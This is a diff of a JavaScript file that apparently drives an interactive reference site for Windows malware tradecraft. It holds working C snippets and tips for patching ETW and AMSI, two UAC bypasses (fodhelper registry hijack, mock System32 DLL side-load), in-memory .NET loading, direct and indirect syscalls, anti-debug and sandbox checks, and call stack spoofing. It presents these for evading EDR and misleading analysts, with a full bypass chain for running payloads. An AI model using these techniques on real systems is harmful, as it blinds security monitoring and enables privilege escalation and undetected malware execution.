+{t:"ETW bypass - patch EtwEventWrite",l:"c",c:"// Patch ntdll!EtwEventWrite to return 0 (STATUS_SUCCESS)\n// This kills all usermode ETW telemetry\nHMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\nVOID* pEtw = GetProcAddress(hNtdll, \"EtwEventWrite\");\n\n// Method 1: ret 0 (3 bytes)\n// xor eax,eax (33 C0) + ret (C3)\nDWORD oldProtect;\nVirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &oldProtect);\n*(DWORD*)pEtw = 0x00C3C033; // xor eax,eax; ret; pad\nVirtualProtect(pEtw, 4, oldProtect, &oldProtect);\n\n// Method 2: 64-bit safe (4 bytes)\n// 48 33 C0 C3 = xor rax,rax; ret\nBYTE patch[] = {0x48, 0x33, 0xC0, 0xC3};\nmemcpy(pEtw, patch, sizeof(patch));\n\n// Method 3: No VirtualProtect (use NtProtect or syscall)\nPVOID addr = pEtw;\nSIZE_T sz = 4;\nDWORD old;\nNtProtectVirtualMemory((HANDLE)-1, &addr, &sz,\n    PAGE_EXECUTE_READWRITE, &old);\n*(DWORD*)pEtw = 0x00C3C033;\nNtProtectVirtualMemory((HANDLE)-1, &addr, &sz, old, &old);"},
+{t:"ETW bypass - patch provider GUID",l:"c",c:"// Instead of patching the function, zero the provider GUID\n// EtwEventWrite checks provider registration - no match = no event\n\n// The Microsoft-Windows-Threat-Intelligence GUID:\n// {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}\n// Find the provider handle struct and zero its GUID\n//\n// Alt: patch EtwEventWriteFull, EtwEventWriteTransfer,\n// and EtwEventWriteEx for full coverage\n//\n// Targeted approach - only kill specific providers:\nvoid PatchProvider(LPCWSTR providerName) {\n    // Walk PEB -> ntdll -> find _ETW_REG_ENTRY list\n    // Match provider GUID, zero it\n    // Leaves benign ETW intact, only kills TI provider\n}\n\n// Detection note: Kernel ETW (EtwTi) is NOT affected\n// by usermode patches. This only blinds usermode consumers."},
+{t:"AMSI bypass - patch AmsiScanBuffer",l:"c",c:"// Force AmsiScanBuffer to return E_INVALIDARG\n// Buffer is never scanned - all content passes\n\n// amsi!AmsiScanBuffer patch\nHMODULE hAmsi = LoadLibraryA(\"amsi.dll\");\nVOID* pScan = GetProcAddress(hAmsi, \"AmsiScanBuffer\");\n\nDWORD old;\nVirtualProtect(pScan, 8, PAGE_EXECUTE_READWRITE, &old);\n\n// mov eax, 0x80070057 (E_INVALIDARG); ret\n// B8 57 00 07 80 C3\nBYTE patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};\nmemcpy(pScan, patch, sizeof(patch));\n\nVirtualProtect(pScan, 8, old, &old);\n\n// For .NET context (C#):\n// var fi = typeof(AmsiUtils).GetField(\"amsiContext\",\n//     BindingFlags.NonPublic|BindingFlags.Static);\n// fi.SetValue(null, IntPtr.Zero);\n// (zeroed context -> AmsiOpenSession fails -> no scan)"},
+{t:"AMSI bypass - AmsiOpenSession patch",l:"c",c:"// Alternative: patch AmsiOpenSession instead\n// Lighter touch - session fails, scan never starts\n\nHMODULE hAmsi = LoadLibraryA(\"amsi.dll\");\nVOID* pOpen = GetProcAddress(hAmsi, \"AmsiOpenSession\");\n\nDWORD old;\nVirtualProtect(pOpen, 8, PAGE_EXECUTE_READWRITE, &old);\n\n// Force failure return\nBYTE patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};\nmemcpy(pOpen, patch, sizeof(patch));\nVirtualProtect(pOpen, 8, old, &old);\n\n// Also consider: AmsiInitialize patch\n// If AMSI init fails, the host (PowerShell) continues\n// without AMSI - no scanning at all\n\n// PowerShell-specific bypass via reflection:\n// [Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\")\n//   .GetField(\"amsiInitFailed\",...).SetValue($null,$true)"},
+{t:"UAC bypass - fodhelper.exe",l:"c",c:"// fodhelper.exe auto-elevates and checks:\n// HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\n// Set (Default) to your payload, launch fodhelper\n\n#include <windows.h>\n\nvoid BypassUAC(LPCSTR payload) {\n    HKEY hKey;\n    LPCSTR subkey = \"Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\";\n    \n    // Create registry key\n    RegCreateKeyExA(HKEY_CURRENT_USER, subkey,\n        0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL);\n    \n    // Set default value to payload path\n    RegSetValueExA(hKey, NULL, 0, REG_SZ,\n        (BYTE*)payload, strlen(payload)+1);\n    \n    // Set DelegateExecute to empty string (required)\n    RegSetValueExA(hKey, \"DelegateExecute\", 0, REG_SZ,\n        (BYTE*)\"\", 1);\n    \n    RegCloseKey(hKey);\n    \n    // Launch fodhelper (auto-elevates)\n    ShellExecuteA(NULL, \"open\",\n        \"C:\\\\Windows\\\\System32\\\\fodhelper.exe\",\n        NULL, NULL, SW_HIDE);\n    \n    // Cleanup: delete the key\n    Sleep(2000);\n    RegDeleteTreeA(HKEY_CURRENT_USER, subkey);\n}"},
+{t:"UAC bypass - mock trusted directory",l:"c",c:"// Auto-elevate whitelist checks: is exe in C:\\Windows\\System32?\n// Trick: create \"C:\\Windows \\System32\" (trailing space)\n// Path check passes, but DLL search uses our fake dir\n\n// Step 1: Create mock directory\nCreateDirectoryW(L\"C:\\\\Windows \\\\\", NULL); // note trailing space\nCreateDirectoryW(L\"C:\\\\Windows \\\\System32\\\\\", NULL);\n\n// Step 2: Copy auto-elevate binary there\nCopyFileW(L\"C:\\\\Windows\\\\System32\\\\computerdefaults.exe\",\n    L\"C:\\\\Windows \\\\System32\\\\computerdefaults.exe\", FALSE);\n\n// Step 3: Drop malicious DLL (check Import Table for candidates)\n// e.g. profapi.dll, propsys.dll - commonly side-loaded\nCopyFileW(L\"payload.dll\",\n    L\"C:\\\\Windows \\\\System32\\\\profapi.dll\", FALSE);\n\n// Step 4: Launch from mock dir\nShellExecuteW(NULL, L\"open\",\n    L\"C:\\\\Windows \\\\System32\\\\computerdefaults.exe\",\n    NULL, NULL, SW_HIDE);\n\n// The binary auto-elevates, loads our DLL from same dir"},
+{t:"CLR in-memory assembly load",l:"c",c:"// Load .NET assembly from memory (no disk touch)\n// Uses COM hosting interface\n\n#include <metahost.h>\n#pragma comment(lib, \"mscoree.lib\")\n\nvoid LoadAssemblyFromMemory(PBYTE asmBytes, DWORD asmLen) {\n    ICLRMetaHost* pMeta = NULL;\n    ICLRRuntimeInfo* pInfo = NULL;\n    ICLRRuntimeHost* pHost = NULL;\n    ICorRuntimeHost* pCorHost = NULL;\n    \n    CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost,\n        (VOID**)&pMeta);\n    pMeta->GetRuntime(L\"v4.0.30319\", IID_ICLRRuntimeInfo,\n        (VOID**)&pInfo);\n    pInfo->GetInterface(CLSID_CorRuntimeHost,\n        IID_ICorRuntimeHost, (VOID**)&pCorHost);\n    pCorHost->Start();\n    \n    // Get default AppDomain\n    IUnknown* pDomainUnk = NULL;\n    pCorHost->GetDefaultDomain(&pDomainUnk);\n    _AppDomain* pDomain = NULL;\n    pDomainUnk->QueryInterface(__uuidof(_AppDomain),\n        (VOID**)&pDomain);\n    \n    // Create SafeArray from bytes\n    SAFEARRAYBOUND bound = {asmLen, 0};\n    SAFEARRAY* pSA = SafeArrayCreate(VT_UI1, 1, &bound);\n    PVOID data;\n    SafeArrayAccessData(pSA, &data);\n    memcpy(data, asmBytes, asmLen);\n    SafeArrayUnaccessData(pSA);\n    \n    // Load and invoke\n    _Assembly* pAsm = NULL;\n    pDomain->Load_3(pSA, &pAsm);\n    \n    _MethodInfo* pEntry = NULL;\n    pAsm->get_EntryPoint(&pEntry);\n    \n    VARIANT retVal;\n    VARIANT args;\n    VariantInit(&args);\n    pEntry->Invoke_3(args, NULL, &retVal);\n}"},
+{t:"Patching with syscalls (no API hooks)",l:"c",c:"// Combine: use direct syscalls to do the patching\n// so VirtualProtect/WriteProcessMemory are never called\n\n// Step 1: resolve NtProtectVirtualMemory SSN\nDWORD ssnProtect = ResolveSyscallNumber(\"NtProtectVirtualMemory\");\n\n// Step 2: make target writable via syscall\nPVOID addr = pTarget; // e.g. EtwEventWrite\nSIZE_T sz = 8;\nDWORD old;\nDoSyscall(ssnProtect, (HANDLE)-1, &addr, &sz,\n    PAGE_EXECUTE_READWRITE, &old);\n\n// Step 3: write patch bytes directly\nmemcpy(pTarget, patchBytes, patchLen);\n\n// Step 4: restore protection via syscall\nDoSyscall(ssnProtect, (HANDLE)-1, &addr, &sz, old, &old);\n\n// No VirtualProtect call in IAT or call stack\n// No WriteProcessMemory needed (same-process write)\n// EDR sees NtProtectVirtualMemory syscall from your code\n// but if using indirect syscall, origin looks like ntdll"}
+];
+C.kit=[
+{t:"ntdll + kernel32 handles (no hash)",l:"c",c:"// ntdll = 2nd in InMemoryOrder, kernel32 = 3rd\n// No hash comparison needed for these two\nPPEB peb = (PPEB)__readgsqword("+d.pc+");\nPLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;\nPLIST_ENTRY first  = head->Flink;          // exe\nPLIST_ENTRY second = first->Flink;         // ntdll\nPLIST_ENTRY third  = second->Flink;        // kernel32\n\nHMODULE hNtdll = (HMODULE)CONTAINING_RECORD(\n    second, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)->DllBase;\nHMODULE hK32   = (HMODULE)CONTAINING_RECORD(\n    third, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)->DllBase;\n\n// Alt: InInitializationOrderModuleList\n// ntdll is FIRST (initializes first)\nHMODULE hNtdll2 = (HMODULE)CONTAINING_RECORD(\n    peb->Ldr->InInitializationOrderModuleList.Flink,\n    LDR_DATA_TABLE_ENTRY,\n    InInitializationOrderLinks)->DllBase;"},
+{t:"PEB fields (no API calls)",l:"c",c:"PPEB peb = (PPEB)__readgsqword(0x60);\n\n// Anti-debug\nif (peb->BeingDebugged) goto bail;              // +0x02\nif (*(DWORD*)((PBYTE)peb + 0x68) & 0x70) goto bail; // NtGlobalFlag\n\n// OS version (no GetVersionEx)\nDWORD major = peb->OSMajorVersion;    // +0xA4\nDWORD build = peb->OSBuildNumber;     // +0xAC\n\n// Process info (no GetCommandLine/GetModuleFileName)\nPRTL_USER_PROCESS_PARAMETERS p = peb->ProcessParameters;\nPWSTR cmdLine    = p->CommandLine.Buffer;\nPWSTR imagePath  = p->ImagePathName.Buffer;\nPWSTR currentDir = p->CurrentDirectory.DosPath.Buffer;\n\n// Own base (no GetModuleHandle(NULL))\nPVOID myBase = peb->ImageBaseAddress;  // +0x10\n\n// Process heap (no GetProcessHeap)\nPVOID heap = peb->ProcessHeap;          // +0x30"},
+{t:"SharedUserData (no API, no PEB)",l:"c",c:"// 0x7FFE0000 always mapped as KUSER_SHARED_DATA\n// Read-only, all processes, no API needed\n#define USD ((PKUSER_SHARED_DATA)0x7FFE0000)\n\n// Tick count (no GetTickCount)\nULONG ticks = *(DWORD*)0x7FFE0320;\n\n// System time (no GetSystemTime)\nLARGE_INTEGER t;\nt.LowPart  = USD->SystemTime.LowPart;\nt.HighPart = USD->SystemTime.High1Time;\n\n// Timing-based sandbox check:\nULONG t1 = *(DWORD*)0x7FFE0320;\nvolatile int j=0; for(int i=0;i<1000;i++) j+=i;\nULONG t2 = *(DWORD*)0x7FFE0320;\nif ((t2-t1) > 500) goto too_slow; // emulation\n\n// NtSystemRoot for clean ntdll path\n// USD->NtSystemRoot = L\"C:\\\\Windows\""},
+{t:"Anti-analysis preflight",l:"c",c:"BOOL IsSafe(void) {\n    PPEB peb = (PPEB)__readgsqword(0x60);\n\n    // 1. BeingDebugged (PEB+0x02)\n    if (peb->BeingDebugged) return FALSE;\n\n    // 2. NtGlobalFlag (+0x68 x64)\n    if (*(DWORD*)((PBYTE)peb + 0x68) & 0x70) return FALSE;\n\n    // 3. Hardware breakpoints (DR0-DR3)\n    CONTEXT ctx = {0};\n    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\n    GetThreadContext(GetCurrentThread(), &ctx);\n    if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return FALSE;\n\n    // 4. Heap flags (+0x70 on ProcessHeap)\n    DWORD hf = *(DWORD*)((PBYTE)peb->ProcessHeap + 0x70);\n    if (hf != 0x02) return FALSE;\n\n    // 5. Timing via SharedUserData\n    DWORD t1 = *(DWORD*)0x7FFE0320;\n    volatile int j=0; for(int i=0;i<1000;i++) j+=i;\n    DWORD t2 = *(DWORD*)0x7FFE0320;\n    if ((t2 - t1) > 500) return FALSE;\n\n    return TRUE;\n}"},
+{t:"Nt* function typedefs",l:"c",c:"typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(\n    HANDLE ProcessHandle,     // -1 for self\n    PVOID* BaseAddress,       // in/out\n    ULONG_PTR ZeroBits,       // 0\n    PSIZE_T RegionSize,       // in/out\n    ULONG AllocationType,     // MEM_COMMIT|MEM_RESERVE\n    ULONG Protect             // PAGE_READWRITE\n);\n\ntypedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(\n    HANDLE ProcessHandle,\n    PVOID* BaseAddress,       // in/out (page-aligned)\n    PSIZE_T RegionSize,       // in/out\n    ULONG NewProtect,\n    PULONG OldProtect         // out\n);\n\ntypedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(\n    HANDLE ProcessHandle,\n    PVOID BaseAddress,\n    PVOID Buffer,\n    SIZE_T NumberOfBytes,\n    PSIZE_T BytesWritten      // opt\n);\n\ntypedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(\n    PHANDLE ThreadHandle,     // out\n    ACCESS_MASK DesiredAccess, // THREAD_ALL_ACCESS\n    PVOID ObjectAttributes,   // NULL\n    HANDLE ProcessHandle,     // -1 for self\n    PVOID StartRoutine,       // entry\n    PVOID Argument,           // param\n    ULONG Flags,              // 0 or HIDE_FROM_DEBUGGER\n    SIZE_T ZeroBits, SIZE_T StackSize,\n    SIZE_T MaxStackSize, PVOID AttrList\n);\n\ntypedef NTSTATUS(NTAPI* NtFreeVirtualMemory_t)(\n    HANDLE ProcessHandle,\n    PVOID* BaseAddress,\n    PSIZE_T RegionSize,\n    ULONG FreeType            // MEM_RELEASE\n);\n\n// Usage:\nNtAllocateVirtualMemory_t pAlloc =\n    (NtAllocateVirtualMemory_t)ResolveHash(H_NTDLL, H_NtAlloc);\nPVOID base = NULL; SIZE_T sz = 0x1000;\npAlloc((HANDLE)-1, &base, 0, &sz,\n    MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);"},
+{t:"SSN reference table (Win10/11 x64)",l:"c",c:"// Common SSNs across Windows 10/11 builds (x64)\n// Most memory/process SSNs are STABLE across builds\n// Thread creation SSNs SHIFT - always resolve dynamically!\n//\n// Function                    1809  1903  2004  21H2  22H2  23H2\n// NtAllocateVirtualMemory     0x18  0x18  0x18  0x18  0x18  0x18\n// NtFreeVirtualMemory         0x1E  0x1E  0x1E  0x1E  0x1E  0x1E\n// NtProtectVirtualMemory      0x50  0x50  0x50  0x50  0x50  0x50\n// NtWriteVirtualMemory        0x3A  0x3A  0x3A  0x3A  0x3A  0x3A\n// NtReadVirtualMemory         0x3F  0x3F  0x3F  0x3F  0x3F  0x3F\n// NtOpenProcess               0x26  0x26  0x26  0x26  0x26  0x26\n// NtClose                     0x0F  0x0F  0x0F  0x0F  0x0F  0x0F\n// NtQueryInfoProcess          0x19  0x19  0x19  0x19  0x19  0x19\n// NtCreateSection             0x4A  0x4A  0x4A  0x4A  0x4A  0x4A\n// NtMapViewOfSection          0x28  0x28  0x28  0x28  0x28  0x28\n// NtWaitForSingleObject       0x04  0x04  0x04  0x04  0x04  0x04\n// NtCreateThreadEx            0xC1  0xC2  0xC2  0xC7  0xC7  0xCB  <-- shifts!\n//\n// Rule: Halo's Gate or clean ntdll for reliability"},
+{t:"Find syscall;ret gadget",l:"c",c:"// Scan ntdll for 0F 05 C3 (syscall; ret) for indirect syscalls\nPBYTE FindSyscallRet(HMODULE hNtdll) {\n    PIMAGE_SECTION_HEADER text = FindSection((PBYTE)hNtdll, \".text\");\n    PBYTE start = (PBYTE)hNtdll + text->VirtualAddress;\n    DWORD size  = text->Misc.VirtualSize;\n    for (DWORD i = 0; i < size - 2; i++) {\n        if (start[i]==0x0F && start[i+1]==0x05 && start[i+2]==0xC3)\n            return &start[i];\n    }\n    return NULL;\n}\n\n// Randomized (avoid signature on fixed offset):\nPBYTE FindRandomGadget(HMODULE hNtdll) {\n    PBYTE matches[256]; int n = 0;\n    // ... collect all 0F 05 C3 matches ...\n    DWORD tick = *(DWORD*)0x7FFE0320;\n    return matches[tick % n];\n}"},
+{t:"XOR key from PEB (per-process)",l:"c",c:"// ASLR randomizes PEB address each launch\n// Use as cheap per-process unique XOR key\nDWORD xorKey = (DWORD)((ULONG_PTR)peb ^ ((ULONG_PTR)peb >> 16));\n\n// Encrypt/decrypt in-memory strings, hashes\nfor (int i = 0; i < len; i++)\n    buf[i] ^= ((BYTE*)&xorKey)[i % 4];\n\n// Or derive from multiple sources:\nDWORD key = (DWORD)__rdtsc() ^ GetCurrentProcessId()\n           ^ (DWORD)(ULONG_PTR)peb;"},
+{t:"KnownDlls for clean ntdll",l:"c",c:"// Faster than disk read - kernel-cached section object\nHANDLE hSection = NULL;\nUNICODE_STRING name;\nRtlInitUnicodeString(&name, L\"\\\\KnownDlls\\\\ntdll.dll\");\nOBJECT_ATTRIBUTES oa;\nInitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);\n\nNtOpenSection(&hSection, SECTION_MAP_READ, &oa);\n\nPVOID cleanNtdll = NULL;\nSIZE_T viewSize = 0;\nNtMapViewOfSection(hSection, (HANDLE)-1, &cleanNtdll,\n    0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);\n\n// Now parse exports from cleanNtdll to extract SSNs\n// This copy is never hooked by usermode EDR"}
+];
+return C[s]||[];
+}
+
+// Evasion tricks
+var TR={
+peb:[{t:"ntdll handle: zero-comparison shortcut",d:"ntdll is ALWAYS the first module in InInitializationOrderModuleList and second in InMemoryOrderModuleList. Skip hash comparison entirely: just grab Flink->Flink from InMemoryOrder head and read DllBase. Two pointer dereferences, zero string/hash ops."},{t:"kernel32 handle: third entry",d:"kernel32.dll (or kernelbase.dll on Win7+) is reliably the third entry in InMemoryOrderModuleList. Flink->Flink->Flink from head. No hash needed for the two most critical modules."},{t:"Own module base from PEB",d:"PEB->ImageBaseAddress (+0x10) gives your own process image base directly. No need to walk module lists. Useful for self-parsing or reflective loading."},{t:"PEB unlinking",d:"Remove your module from all 3 LDR lists (InLoadOrder, InMemoryOrder, InInitOrder). Memory still exists but PEB-based scanners are blind. Unlink Flink/Blink pointers on each list."},{t:"BeingDebugged: one-byte check",d:"PEB+0x02 is a single BYTE. Check with: if (*(BYTE*)((PBYTE)pPeb + 2)). Also NtGlobalFlag (+0x68 x64 / +0xBC x86) is set to 0x70 (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS) by debuggers."},{t:"ProcessParameters from PEB",d:"PEB->ProcessParameters (+0x20 x64) gives RTL_USER_PROCESS_PARAMETERS with CommandLine, ImagePathName, Environment, CurrentDirectory, WindowTitle without any API calls. Useful for anti-sandbox checks."},{t:"Stack bounds from TEB",d:"TEB->StackBase (+0x08) and TEB->StackLimit (+0x10) give current thread stack boundaries. Useful for stack pivoting, detecting stack-based hooks, or ensuring your shellcode stack frames stay in bounds."},{t:"NtCurrentProcess/Thread shortcuts",d:"NtCurrentProcess() = (HANDLE)-1 = 0xFFFFFFFFFFFFFFFF. NtCurrentThread() = (HANDLE)-2. These are pseudo-handles that work with all Nt* APIs - no need to call OpenProcess/OpenThread on yourself."}],
+pe:[{t:"Header stomping",d:"Zero DOS+NT headers post-mapping. No MZ/PE signatures in memory scans. Also zero the Rich header (between DOS and PE headers) which contains build environment fingerprints."},{t:"IMAGE_FIRST_SECTION macro",d:"Section headers start immediately after OptionalHeader. The macro: (PIMAGE_SECTION_HEADER)((PBYTE)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader). Works on both x86/x64 without hardcoding offsets."},{t:"Permission mimicry",d:"Map Characteristics flags to proper R/RX/RW. Never leave RWX. Key flags: IMAGE_SCN_MEM_EXECUTE (0x20000000), IMAGE_SCN_MEM_READ (0x40000000), IMAGE_SCN_MEM_WRITE (0x80000000)."},{t:"SizeOfImage spoofing",d:"Allocate more than SizeOfImage and map PE at random offset within the allocation. Scanners looking for MZ at allocation base boundaries miss it."},{t:"Rich header fingerprinting",d:"The Rich header (between DOS stub and PE sig) contains linker/compiler version info. Defenders use it for attribution. Zero it, or replace with Rich header from a legitimate Microsoft binary to mislead analysts."}],
+exp:[{t:"Export name mangling",d:"Name payload exports like legitimate ones (DllGetClassObject, ServiceMain, DllCanUnloadNow). Static analysis tools see familiar names."},{t:"Delayed resolution",d:"Don't resolve all exports at load time. Lazy-resolve on first call reduces the window where resolved addresses are visible in memory."},{t:"Binary search on AddressOfNames",d:"Names array is sorted lexicographically. Use binary search O(log n) instead of linear scan O(n). ntdll has ~2000 exports - binary search hits in ~11 iterations max."},{t:"EAT hooking detection",d:"Compare the resolved funcRVA against the .text section bounds of the target DLL. If funcRVA points outside .text (e.g. into a trampoline in .data or a detour DLL), the export is hooked. Fall back to clean ntdll or syscalls."}],
+hash:[{t:"Per-build hash rotation",d:"Random seed per build. Each binary gets unique hash constants. Automated CI generates seed, pre-computes all hashes, embeds them. Defeats YARA rules matching known hash constants."},{t:"Cascaded hashing",d:"Apply two different hash algorithms in sequence. Even if one algorithm is fingerprinted, the cascade produces entirely different output values."},{t:"Encrypted hash table",d:"Store hash constants encrypted in .data. Decrypt into stack variables at runtime, use for comparison, then zero the stack. Hash values never appear in cleartext on disk."},{t:"ROR13 is 2 instructions per char",d:"ROR + ADD per character. Fits perfectly in tight shellcode loops. The 13-bit rotation was chosen specifically because it gives good distribution across ASCII ranges while being a single x86 ROR instruction."},{t:"Case-insensitive via OR 0x20",d:"Instead of calling toupper/tolower, use: c |= 0x20 to force lowercase (works for A-Z). Single bitwise OR, no branch, no function call. For wide chars: c |= 0x0020."},{t:"Compile-time hash via constexpr",d:"C++17 consteval forces compile-time evaluation. The hash function runs at compile time and only the final DWORD constant ends up in the binary. Zero strings, zero runtime hash computation for known targets."}],
+imp:[{t:"Delayed resolution",d:"Resolve on first use via self-patching stub."},{t:"IAT camouflage",d:"Include benign imports. Real calls via hash."},{t:"VEH-based IAT hiding",d:"PAGE_NOACCESS on IAT pages. VEH resolves on fault."}],
+rel:[{t:"Preferred base avoidance",d:"Never map at preferred ImageBase."},{t:"Reloc encryption",d:"Encrypt reloc data. Decrypt, apply, re-zero."}],
+map:[{t:"Permission cycling",d:"Alloc RW \u2192 write all data \u2192 flip code to RX \u2192 read-only to R. Never have RWX at any point. Private RWX memory is the #1 EDR heuristic signal."},{t:"Module stomping",d:"Load a legitimate DLL with DONT_RESOLVE_DLL_REFERENCES, overwrite its .text section. Memory scanners see a known module at that address, not suspicious private allocation. Pick a DLL with a .text section large enough for your payload."},{t:"Phantom DLL hollowing",d:"NtCreateSection + NtMapViewOfSection of a legit on-disk DLL, then overwrite the mapped view. The memory is backed by a legitimate file, defeating file-backed memory checks."},{t:"KnownDlls for clean ntdll",d:"Instead of reading ntdll from disk, open \\KnownDlls\\ntdll.dll section object with NtOpenSection + NtMapViewOfSection. This is the kernel-cached copy, faster than disk I/O and always clean."},{t:"Thread execution alternatives",d:"CreateRemoteThread is heavily monitored. Alternatives: NtQueueApcThread (APC queues), SuspendThread+GetThreadContext+SetRip+ResumeThread (hijacking), TLS callbacks, vectored exception handlers, NtCreateThreadEx with hidden-from-debugger flag, fiber-based execution."},{t:"NtCurrentProcess = -1",d:"No need to OpenProcess on yourself. NtCurrentProcess() is just (HANDLE)-1 and NtCurrentThread() is (HANDLE)-2. These pseudo-handles work with NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, etc."},{t:"Timing / sandbox evasion",d:"SharedUserData (0x7FFE0000) has TickCountLow without API calls. Two reads with work in between - if delta is too small, you are being fast-forwarded (sandbox). Also check: disk size < 50GB, RAM < 4GB, username = sandbox indicators."},{t:"Entropy reduction",d:"High-entropy .text sections trigger scanner heuristics. XOR payload with a repeating key derived from a common pattern (e.g., the PE header itself) to produce lower Shannon entropy. Or use custom packing that mimics legitimate code entropy (~4.5-5.5 bits/byte)."}],
+byp:[
+{t:"ETW is usermode-only blind",d:"Patching EtwEventWrite only kills usermode ETW consumers. Kernel ETW (EtwTi) fires from kernel callbacks and cannot be patched from usermode. Kernel telemetry still sees NtAllocateVirtualMemory, NtMapViewOfSection, NtProtectVirtualMemory calls. This buys you time, not invisibility."},
+{t:"AMSI scan order matters",d:"AMSI scans happen at script block boundaries. If you split your payload across multiple blocks, each individual block may pass scanning. Also: AMSI doesn't scan compiled .NET assemblies loaded via Assembly.Load(byte[]) in all contexts - the bypass may not even be needed."},
+{t:"Patch timing is critical",d:"Patch ETW/AMSI BEFORE your real payload runs, then optionally restore original bytes after. Some EDRs periodically check function prologues for patches (integrity scanning). Restore originals, then re-patch only during active operations."},
+{t:"UAC bypass selection criteria",d:"fodhelper and computerdefaults require registry writes to HKCU (noisy). Mock directory technique requires creating dirs in C:\\Windows (may trigger alerts). COM hijacking via CMSTP or wsreset is quieter but more complex. Choose based on target EDR's monitored events."},
+{t:"Chain your bypasses",d:"Full bypass chain: (1) Resolve Nt* via hashed PEB walk, (2) ETW patch via direct syscall, (3) AMSI patch via direct syscall, (4) load payload via manual map or CLR host, (5) restore patches. Each step uses the previous step's infrastructure."},
+{t:"CLR ETW is separate from ntdll ETW",d:"The .NET CLR has its own ETW provider (Microsoft-Windows-DotNETRuntime). Patching ntdll!EtwEventWrite doesn't silence CLR ETW if the runtime uses its own code path. Patch both, or target the CLR provider GUID specifically."},
+{t:"Unhooking vs patching tradeoffs",d:"Unhooking (remapping clean ntdll) restores ALL functions but is very detectable (private memory vs image-backed). Patching specific functions is surgical but you must know exactly which functions to patch. Syscalls bypass hooks entirely without touching ntdll at all."}
+],
+kit:[{t:"Module order is guaranteed",d:"ntdll is always 1st initialized (InInitOrder) and 2nd in memory order (InMemoryOrder). kernel32 is 3rd in memory order. These positions are set by the Windows loader and have been stable since XP. Two pointer dereferences, zero comparisons."},{t:"SharedUserData is unmonitorable",d:"0x7FFE0000 is a read-only mapping of kernel data. EDRs cannot hook it because it is mapped from kernel space. Provides tick count, system time, NT version, system root path. Perfect for timing checks and OS detection without any API calls."},{t:"PEB has everything for preflight",d:"BeingDebugged, NtGlobalFlag, heap flags, OS version, command line, image path, current directory, process heap - all at fixed offsets. A single PEB pointer gives you enough for comprehensive anti-analysis without a single API call."},{t:"Debug register checks via GetThreadContext",d:"Hardware breakpoints set DR0-DR3. Call GetThreadContext with CONTEXT_DEBUG_REGISTERS. If any DR is non-zero, analyst is using hardware breakpoints. Note: GetThreadContext itself can be hooked - consider direct NtGetContextThread."},{t:"Combine timing sources",d:"Cross-reference multiple timing sources: SharedUserData.TickCountLow, RDTSC/RDTSCP, QueryPerformanceCounter. If they disagree significantly, someone is patching one but not others. Sandboxes often only hook one timing source."},{t:"KnownDlls over disk reads",d:"\\KnownDlls\\ntdll.dll is the kernel-cached section object. NtOpenSection + NtMapViewOfSection is faster than CreateFile + ReadFile on the disk copy, and guaranteed to be the same version the process loaded."}],
+sys:[{t:"Syscall;ret gadget scan",d:"Scan ntdll for the byte sequence 0F 05 C3 (syscall; ret). This is your indirect syscall target. There are usually multiple instances - pick one at random each execution to vary the return address."},{t:"Indirect syscalls",d:"JMP to ntdll syscall instruction instead of executing from your code. Return address on the stack points to ntdll, looking legitimate to stack walkers."},{t:"SSN obfuscation",d:"Encrypt SSN table in binary. Decrypt at runtime with key derived from RDTSC/PID. Defeats static extraction of syscall numbers."},{t:"Heaven's Gate (WoW64)",d:"In WoW64 (32-on-64) processes, far-jump to CS=0x33 to switch CPU to 64-bit mode and call native ntdll64 directly. WoW64 ntdll32 is heavily hooked but native ntdll64 is often clean. SSNs differ between the two!"},{t:"Call stack spoofing",d:"Forge fake RBP chain and return addresses pointing through legitimate modules (ntdll, kernel32). EDR stack walks see normal BaseThreadInitThunk -> RtlUserThreadStart chain instead of your code. Three approaches: synthetic frame construction, RBP chain manipulation, or return address masking via guard pages."},{t:"Halo's Gate (dynamic SSN)",d:"Resolve SSN at runtime even when target stub is hooked. Check if stub starts with 4C 8B D1 B8 (clean). If not, scan neighboring stubs (\u00b132 bytes) since SSNs are sequential. Neighbor's SSN \u00b1 offset = your SSN."},{t:"Spoofed indirect combo",d:"The gold standard: combine indirect syscalls (JMP to ntdll's syscall;ret) with call stack spoofing (fake RBP frames). Fixes both the syscall origin address AND the return address chain. Most resilient against modern ETW+stack-walking EDRs."}]
+};
+
+// State
+var S={a:"x64",s:"peb",t:"flow",ms:0};
+
+function render(){
+var d=AD[S.a],si=SE.findIndex(function(x){return x.id===S.s}),so=SE[si];
+var codes=getCodes(S.s,d),tricks=TR[S.s]||[];
+
+var flow='';
+if(S.s==='peb')flow=fPEB(d);else if(S.s==='pe')flow=fPE(d);else if(S.s==='exp')flow=fEXP(d);
+else if(S.s==='hash')flow=fHASH();else if(S.s==='imp')flow=fIMP(d);else if(S.s==='rel')flow=fREL(d);
+else if(S.s==='map')flow=fMAP();else if(S.s==='sys')flow=fSYS(d);
+else if(S.s==='kit')flow=fKIT(d);
+else if(S.s==='byp')flow=fBYP(d);
+
+var chtml=codes.length===0?'<div style="color:#4b5563;padding:16px;text-align:center">No code examples yet.</div>':
